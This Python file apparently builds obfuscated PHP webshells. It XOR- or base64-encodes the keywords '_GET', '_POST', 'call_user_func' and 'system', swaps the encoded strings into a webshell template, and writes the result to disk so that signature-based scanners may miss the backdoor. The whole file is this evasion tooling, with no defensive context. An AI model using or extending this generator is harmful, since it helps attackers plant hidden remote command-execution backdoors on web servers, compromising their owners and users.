import base64
from encrypt import *
from template import *

keys = ['_GET','_POST','call_user_func','system']
encrypt_s = ['xor2','xor2_base64']

class Constructor:
    def __init__(self,template_type,encrypt_key,):
        self.template = globals()[template_type]
        self.key = encrypt_key
        self.values = {}

    def _prepare(self):
        for k in keys:
            self.values[k] = globals()[self.key](k)


    def get_template(self):
        self._prepare()
        for k,v in self.values.items():
            self.template = self.template.replace(k,v)

        return self.template

    def generate(self,filename):
        with open(filename,'w+') as fi:
            fi.write(self.get_template())

class ConstructorXorN(Constructor):
    def __init__(self,template_type,encrypt_key,forN):
        super(ConstructorXorN, self).__init__(template_type,encrypt_key,)
        self.forN = forN

    def _prepare(self):
        for k in keys:
            self.values[k] = globals()[self.key](k,self.forN)

    def get_template(self):
        self._prepare()
        for k,v in self.values.items():
            self.template = self.template.replace(k,v)

        return self.template